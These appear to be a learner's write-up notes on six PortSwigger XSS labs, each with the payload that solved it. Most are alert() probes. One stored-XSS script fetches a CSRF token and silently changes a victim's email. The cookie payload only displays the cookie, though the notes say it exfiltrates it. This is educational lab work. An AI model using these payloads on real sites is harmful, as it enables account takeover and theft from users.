# Cross-site Scripting (XSS)
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts, typically JavaScript, into web pages viewed by other users.

## Labs completed

| # | Lab Name | Category | Status |
|---|---|---|---|
| 1 | Exploiting XSS to bypass CSRF defenses | XSS | ✅ Solved |
| 2 | Reflected XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 3 | Stored XSS into HTML context with nothing encoded | XSS | ✅ Solved |
| 4 | DOM XSS in document.write sink using source location.search | XSS | ✅ Solved |
| 5 | DOM XSS in innerHTML sink using source location.search | XSS | ✅ Solved |
| 6 | DOM XSS in jQuery anchor href attribute sink using location.search source | XSS | ✅ Solved |

## Key Techniques

**Lab 1 — Exploiting XSS to bypass CSRF defenses**
Stored XSS in blog comments. Payload fetches victim's account page, 
extracts CSRF token using regex, then uses that token to submit a POST 
request changing the victim's email address — all executed silently 
in the victim's browser without their knowledge.
**Payload:**
```html
<script>
fetch('/my-account')
  .then(response => response.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=test2@test.com'
    });
  });
</script>
```

**Lab 2 - Reflected XSS into HTML context with nothing encoded**
Reflected XSS in search functionality. User input reflected directly into 
page HTML with zero escaping or filtering — payload executes immediately.
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 3 - Stored XSS into HTML context with nothing encoded**
Stored XSS in comment functionality. The comment reflected directly to someone who views it
**Payload:**
```html
<script>alert('xss')</script>
```

**Lab 4 - DOM XSS in document.write sink using source location.search**
DOM based XSS vulnerability lives in client side javascript, not in server. This lab had document.write() directly 
outputting location.search (the URL query parameter) without sanitization.
```html
"><script>alert('XSS')</script>
```
The "> closed the wrapping HTML tag, allowing the script to execute as code 
rather than being treated as data.

**Lab 5 - DOM XSS in innerHTML sink using source location.search**
DOM-based XSS vulnerability where JavaScript code uses innerHTML to write 
location.search (URL query parameter) directly into the page without sanitization.
Key difference from document.write: innerHTML doesn't execute <script> tags 
when inserted, so event handlers like onerror are more reliable.
```html
Payload: <img src=x onerror=alert('XSS')>
```
The broken image triggers the onerror event, executing the JavaScript payload.

**Lab 5 - DOM XSS in jQuery anchor href attribute sink using location.search source**
DOM-based XSS using jQuery. The code took the returnPath URL parameter 
and directly inserted it into a link's href attribute without sanitization.
```html
Payload: javascript:alert(document.cookie)
```
The javascript: scheme tells the browser to execute JavaScript when the link 
is clicked, rather than navigating to a URL. This exfiltrates the victim's cookies.


## Disclaimer
This is performed for educational use only on legal, intentionally vulnerable 
environments such as PortSwigger Web Security Academy labs.